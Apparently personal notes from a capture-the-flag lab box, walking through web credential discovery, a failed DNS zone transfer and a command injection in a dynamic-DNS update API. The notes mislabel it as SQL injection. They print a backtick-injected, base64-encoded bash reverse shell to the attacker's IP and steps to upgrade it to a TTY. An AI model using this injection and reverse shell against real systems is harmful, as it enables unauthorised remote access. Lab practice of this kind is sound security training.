# FootPath
### Port 80

![[Pasted image 20211017070142.png]]

![[Pasted image 20211017070217.png]]

Creds

|Username|Password|
|---|---|
|dynadns| sndanyd|

We are providing dynamic DNS for anyone with the same API as no-ip.com has. Maintaining API conformance helps make clients work properly.


Dynamic DNS for a number of domains:

-   dnsalias.htb
-   dynamicdns.htb
-   no-ip.htb

no-ip API

```
http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&myip=192.0.2.25

```

Port 53

```bash

dig axfr @10.10.10.244 dynstr.htb


; <<>> DiG 9.16.12-Debian <<>> axfr @10.10.10.244 dynstr.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.


```

Checking for zones It didn't work.

Sql Injection in API


```bash
GET /nic/update?hostname=t`echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC40OC85MDAxIDA%2bJjEK|+base64+-d+|+bash`est.no-ip.htb&myip=10.10.14.48 HTTP/1.1
Host: 10.10.10.244
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: curl/7.74.0
Accept: */*
Connection: close

```

![[Pasted image 20211017073334.png]]

```bash

## first command Replace ip and port

echo 'bash -i >& /dev/tcp/10.10.14.48/9001 0>&1' | base64 

## second command

echo -ne YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OC85MDAxIDA+JjEK| base64 -d | bash

```

![[Pasted image 20211017073652.png]]

TTY shell

```bash
python3 -c 'import pty; pty.spawn("bin/bash")'
ctrl+z 
stty -raw echo;fg 
return 
export TERM=xterm

```


[[User]]